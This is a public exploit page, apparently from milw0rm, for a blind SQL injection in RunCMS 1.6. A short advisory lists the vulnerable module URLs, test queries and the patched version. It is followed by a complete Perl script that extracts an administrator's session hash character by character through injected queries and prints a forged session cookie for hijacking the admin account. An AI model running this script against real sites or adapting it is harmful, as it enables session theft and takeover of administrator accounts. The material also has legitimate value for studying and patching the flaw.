<html><head><title>RunCMS 1.6 Get Admin Cookie Remote Blind SQL Injection Exploit</title></head><pre>#/******************************************************************/
#/**** RUNCMS 1.6 BLIND SQL Injection Exploit get Admin Cookie *****/
#/******************************************************************/
#/***********  exploit get admin cookie that can be used  *********/
#/***********  to login by pasting it into browser (Opera) *********/ 
#/***********  and then get access to Admin session        *********/
#/***********  and change Admins password                  *********/ 
#/***********                                              *********/ 
#/******************************************************************/
#/******************************************************************/
#/***********    tested on RUNCMS english version  1.6     *********/
#/******************************************************************/
#/******************************************************************/
#/* Date of Public EXPLOIT:  December 25, 2007                     */
#/* Written by:  Alexandr &quot;Sh2kerr&quot; Polyakov                       */
#/*              from [Digital Security Research Group]            */
#/*              research@dsec.ru                                  */
#/*                                                                */
#/* Original Advisory:                                             */
#/******************************************************************/
#/*                                                               **/
#/******************************************************************/
#
#
#
#
#         Details
#************************************************************************************
#
#
# Multiple Blind SQL Injection
#
# Attacker can inject SQL code in modules:
#
#       http://[server]/[installdir]/modules/mydownloads/brokenfile.php?lid+DSecRG_INJECTION
#       http://[server]/[installdir]/modules/mydownloads/visit.php?lid=2+DSecRG_INJECTION
#       http://[server]/[installdir]/modules/mydownloads/ratefile.php?lid=2+DSecRG_INJECTION
#       http://[server]/[installdir]/modules/mylinks/ratelink.php?lid=2+DSecRG_INJECTION
#       http://[server]/[installdir]/modules/mylinks/modlink.php?lid=2+DSecRG_INJECTION
#       http://[server]/[installdir]/modules/mylinks/brokenlink.php?lid=2+DSecRG_INJECTION
#
# Example:
#
# This query will return link to download file:
#       GET http://[server]/[installdir]/modules/mydownloads/brokenfile.php?lid=1+and+1=1 HTTP/1.0
#
#
# This query will return error:
#       GET http://[server]/[installdir]/modules/mydownloads/brokenfile.php?lid=1+and+1=0 HTTP/1.0
#
#
#
#    Fix Information
#*************************************************************************************
#
#RunCMS was altered to fix this flaw on Dec 15, 2007. Updated version (1.6.1) can be downloaded here:
#       http://www.runcms.org/modules/mydownloads/visit.php?lid=131
#
#
#
#    About
#*************************************************************************************
#
# Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration 
# testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. 
# Digital Security Research Group focuses on web application and database security problems with vulnerability reports, 
# advisories and whitepapers posted regularly on our website.
#
#
# Contact:      research@dsec.ru
#               http://www.dsec.ru (in Russian)
#
#
#
#
####################################################################################


















#!/usr/bin/perl


use LWP::UserAgent;

$path   = $ARGV[0]; 
$string = &quot;this file must&quot;; #  !!CHEAT!! this string must be changed if Runsms language is not English
$user_id = $ARGV[1];
if (@ARGV &lt; 2) { &amp;usage; }


$s_num =1;
$n=0;
$|++;
print &quot;\r\n\r\n&quot;;

 print &quot;************ RunCMS 1.6 Blind SQLInjection  Get Admin Cookie by Sh2kerr (DSecRG)****************\r\n&quot;;
 print &quot;*****************************************************************************\r\n&quot;;
 

while(1)
{
&amp;found(48,122);

if ($char==&quot;0&quot;)
{
print &quot;\r\n\r\n&quot;; 

 ($res1,$res2,$res3)=split(&quot;:&quot;,$allchar);  # 
 $time = $res3+ 2678400;
 print &quot;*****************************************************************************\r\n&quot;;
 print &quot;      Username: $res1\r\n&quot;;
 print &quot;   Cookie Hash: $res2\r\n&quot;;
 print &quot;   Cookie Time: $res3\r\n\r\n&quot;; 
 print &quot;*****************************************************************************\r\n&quot;;
 print &quot;       Place this string into your cookie parameter  (in Opera)              \r\n&quot;;
 print &quot;       rc_sess=a:3:{i:0;i:$user_id;i:1;s:40:\&quot;$res2\&quot;;i:2;i:$time;}          \r\n&quot;;
 print &quot;*****************************************************************************\r\n&quot;;
 if ($allchar==&quot;0&quot; &amp; $res1==&quot;0&quot;) 
 {print &quot;\r\n  ERROR: User not logged in , try another user_id \r\n&quot;; }

#print &quot; total requests: $n\r\n&quot;;
 exit(); 
 }
else 
 { print &quot;:) &quot;;  $allchar .= chr($char); 
 }

$s_num++;
}





sub found($$)
 {
 my $fmin = $_[0];
 my $fmax = $_[1];


 if (($fmax-$fmin)&lt;5) { $char=&amp;crack($fmin,$fmax); return $char } 
 
 $r = int($fmax - ($fmax-$fmin)/2);
 $check = &quot;&gt;$r&quot;;
 
 if ( &amp;check($check) ) 
 { &amp;found($r,$fmax);  }
 else {  &amp;found($fmin,$r+1); }
 }



sub crack($$)
 {
 my $cmin = $_[0];
 my $cmax = $_[1];
 $i = $cmin;
 
 while ($i&lt;$cmax)
  {
  $crcheck = &quot;=$i&quot;;
  if ( &amp;check($crcheck) ) { return $i;}
  $i++;
  }
 return;
 }



sub check($)
 {

 $n++;
 $ccheck = $_[0];

 $http_query = $path.&quot; AND ascii(substring((SELECT CONCAT(uname,CHAR(58),hash,CHAR(58),time) FROM runcms.runcms_session WHERE uid=&quot;.$user_id.&quot;),&quot;.$s_num.&quot;,1))&quot;.$ccheck;

 
 $mcb_reguest = LWP::UserAgent-&gt;new() or die;
 $res = $mcb_reguest-&gt;post($http_query); 

 @results = $res-&gt;content; 
 foreach $result(@results)
  {
  if ($result =~ /$string/) { return 1; }
  }
 return 0;
 }
 
sub usage
 {
 print &quot;Usage: $0 [path_to_script?param] user_id \r\n&quot;;
 print &quot;e.g. : $0 http://server/modules/mydownloads/visit.php?lid=3 1&quot;;
 exit(); 
 }

# milw0rm.com [2007-12-25]</pre></html>